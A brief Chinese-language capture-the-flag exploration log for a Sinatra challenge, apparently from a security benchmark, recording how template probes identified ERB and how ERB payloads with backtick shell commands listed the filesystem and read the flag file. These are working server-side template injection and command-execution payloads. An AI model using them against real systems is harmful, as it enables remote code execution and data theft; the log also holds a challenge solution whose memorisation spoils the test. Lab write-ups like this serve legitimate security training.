# xben-086-24 · 探索记录

对应题解：[`xben-086-24.md`](./xben-086-24.md)

## 目标与起点

`10.0.172.218:4567`，Sinatra，`/generate`（`sentence` + `number`）。

## 第一阶段：模板引擎判定

| payload | 结果 |
| --- | --- |
| `<%= 7*7 %>` | `49` |
| `#{7*7}`、`{{7*7}}`、`${7*7}` | 原样输出 |

## 第二阶段：命令执行

| payload | 结果 |
| --- | --- |
| `<%= \`cat /flag.txt\` %>` | `No such file` |
| `<%= \`ls /\` %>` | 看到 `app`、`flag-entrypoint.sh` |
| `<%= \`cat /app/flag.txt\` %>` | **flag** |

## 这次真正的收获

四个模板语法（ERB/Jinja/Twig/EL）各打一次，能立刻区分框架。
